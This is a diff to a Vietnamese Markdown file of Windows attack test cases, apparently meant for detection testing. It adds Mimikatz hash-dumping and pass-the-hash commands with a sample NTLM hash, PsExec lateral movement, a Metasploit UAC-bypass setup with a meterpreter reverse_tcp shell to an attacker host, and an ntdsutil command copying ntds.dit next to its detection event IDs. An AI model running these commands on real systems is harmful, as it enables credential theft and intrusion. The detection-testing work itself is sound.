@@ -123,11 +123,33 @@ quarkspwdump.exe --dump-hash-domain-cached
 
 
 ## Test case 13: RDP
+* Mở **Remote desktop connection** và nhập vào IP, username, password của máy muốn thực hiện kết nối từ xa
+
 ## Test case 14: Mimikatz
+* Mở cmd hoặc powershell với quyền administrator và chạy mimikatz để thực hiện dump hash password:
+ * `privilege::debug`
+ * `sekurlsa::logonpasswords`
+* Tiến hành pass-the-hash vào current session logon:
+ * Command: `sekurlsa::pth /user:[Tài khoản người dùng] /domain:[Tên domain] /ntlm:[Mã hash NTLM]`
+ * Ví dụ: `sekurlsa::pth /user:sv /domain:WINSRV2008 /ntlm:130b0f15bff820d1dfde026cd3554719`
+* Khi mở phiên mới, ta sử dụng **PsExec***, **net use** hoặc **pushd** để tiến hành pass-the-hash
+ * `PsExec \\192.168.255.100 cmd`
+
+
 ## Test case 15: Bypass UAC
+* Command:
+```
+use exploit/windows/local/bypassuac
+set target 1 # 1 is windows x64
+set session [Session-ID]
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [IP Attacker's machine]
+set LPORT [designated PORT at Attacker's machine]
+```
+
 ## Test case 16: ntdsutil
 * Command: `ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q`
-* Bằng chứng thực thi
+* Bằng chứng thực thi:
   * **Event ID 8222** tại Security Log: Phát hiện sự thực thi của ntdsutil.exe
   * **Event ID 216** tại Application and Service Log: Phát hiện sự sao chép tập tin C:\Windows\NTDS\ntds.dit (Có ghi rõ điểm đến)
   * **Event ID 1** tại Sysmon: Phát hiện sự thực thi của ntdsutil.exe
